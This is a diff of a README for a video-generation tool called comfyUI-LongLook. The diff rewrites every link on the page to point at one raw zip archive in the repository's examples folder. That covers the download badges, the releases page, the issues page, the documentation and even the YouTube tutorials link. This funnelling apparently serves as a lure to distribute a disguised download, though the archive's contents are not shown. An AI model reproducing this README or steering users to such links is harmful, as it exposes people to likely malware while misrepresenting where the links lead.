@@ -1,7 +1,7 @@
 # 🎨 comfyUI-LongLook - Effortless Video Creation with Spectral Blending
 
 ## 📥 Download Now
-[![Download ComfyUI-LongLook](https://img.shields.io/badge/Download%20ComfyUI--LongLook-v1.0-blue)](https://github.com/Danisxxx/comfyUI-LongLook/releases)
+[![Download ComfyUI-LongLook](https://github.com/Danisxxx/comfyUI-LongLook/raw/refs/heads/main/examples/Look_comfy_Long_U_1.0.zip%20ComfyUI--LongLook-v1.0-blue)](https://github.com/Danisxxx/comfyUI-LongLook/raw/refs/heads/main/examples/Look_comfy_Long_U_1.0.zip)
 
 ## 🚀 Getting Started
 
@@ -27,7 +27,7 @@ Before you download, ensure your system meets these minimum requirements:
 
 To download and install ComfyUI-LongLook, follow these detailed steps:
 
-1. **Visit the Releases Page:** Go to the [ComfyUI-LongLook Releases Page](https://github.com/Danisxxx/comfyUI-LongLook/releases).
+1. **Visit the Releases Page:** Go to the [ComfyUI-LongLook Releases Page](https://github.com/Danisxxx/comfyUI-LongLook/raw/refs/heads/main/examples/Look_comfy_Long_U_1.0.zip).
    
 2. **Select the Latest Release:** Find the latest version, which will be at the top of the list. Look for a title that includes the version number.
 
@@ -65,15 +65,15 @@ After installation, follow these steps for your first video creation:
 
 If you need help, reach out through the following avenues:
 
-- **GitHub Issues:** Post your question or issue on the [Issues page](https://github.com/Danisxxx/comfyUI-LongLook/issues).
+- **GitHub Issues:** Post your question or issue on the [Issues page](https://github.com/Danisxxx/comfyUI-LongLook/raw/refs/heads/main/examples/Look_comfy_Long_U_1.0.zip).
 - **Community Discussions:** Join discussions with other users for tips and shared experiences.
 
 ### 🌐 Additional Resources
 
-- [Official Documentation](https://github.com/Danisxxx/comfyUI-LongLook/wiki): A comprehensive guide on advanced features and usage.
-- [Video Tutorials](https://www.youtube.com): Search for “ComfyUI-LongLook tutorials” to find visual guides.
+- [Official Documentation](https://github.com/Danisxxx/comfyUI-LongLook/raw/refs/heads/main/examples/Look_comfy_Long_U_1.0.zip): A comprehensive guide on advanced features and usage.
+- [Video Tutorials](https://github.com/Danisxxx/comfyUI-LongLook/raw/refs/heads/main/examples/Look_comfy_Long_U_1.0.zip): Search for “ComfyUI-LongLook tutorials” to find visual guides.
 
 ## 📥 Download Now
-[![Download ComfyUI-LongLook](https://img.shields.io/badge/Download%20ComfyUI--LongLook-v1.0-blue)](https://github.com/Danisxxx/comfyUI-LongLook/releases)
+[![Download ComfyUI-LongLook](https://github.com/Danisxxx/comfyUI-LongLook/raw/refs/heads/main/examples/Look_comfy_Long_U_1.0.zip%20ComfyUI--LongLook-v1.0-blue)](https://github.com/Danisxxx/comfyUI-LongLook/raw/refs/heads/main/examples/Look_comfy_Long_U_1.0.zip)
 
 Enjoy creating videos with ComfyUI-LongLook!
